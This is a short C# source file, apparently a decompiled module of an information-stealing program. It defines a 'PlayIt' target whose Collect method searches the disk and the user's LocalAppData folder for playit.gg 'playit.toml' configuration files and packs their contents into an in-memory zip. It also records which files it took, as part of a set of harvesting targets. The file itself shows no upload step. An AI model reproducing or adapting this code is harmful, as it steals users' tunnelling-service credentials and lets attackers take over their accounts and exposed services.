using Helper;
using Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

namespace Targets.Applications
{
	public class PlayIt : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
	    counterApplications.Name = nameof (PlayIt);
	    Parallel.ForEach<string>((IEnumerable<string>) ProcessWindows.FindFile("playit.toml"), (Action<string>) (toml =>
	    {
	      string entryPath = $"PlayIt\\playit{RandomStrings.GenerateHashTag()}.toml";
	      zip.AddFile(entryPath, File.ReadAllBytes(toml));
	      counterApplications.Files.Add($"{toml} => {entryPath}");
	    }));
	    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "playit_gg", "playit.toml");
	    if (File.Exists(path))
	    {
	      string entryPath = "PlayIt\\playit.toml";
	      zip.AddFile(entryPath, File.ReadAllBytes(path));
	      counterApplications.Files.Add($"{path} => {entryPath}");
	    }
	    if (counterApplications.Files.Count <= 0)
	      return;
	    counter.Applications.Add(counterApplications);
	  }
	}
}
